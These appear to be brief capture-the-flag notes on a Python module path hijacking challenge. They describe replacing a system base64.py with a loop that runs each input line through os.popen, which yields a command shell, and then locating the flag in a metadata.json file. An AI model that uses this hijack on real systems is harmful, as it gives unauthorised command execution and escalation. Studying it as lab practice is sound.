path hijacking vuln

we can only execute .server.py

we have to edit /usr/bin/python3.8/base64.py definition to just be

import os
while(1):
    cmd=input()
    print(os.popen(cmd).read())

shell basically

go to /challenge dir in top level file
find metadata.json in /challenge dir

flag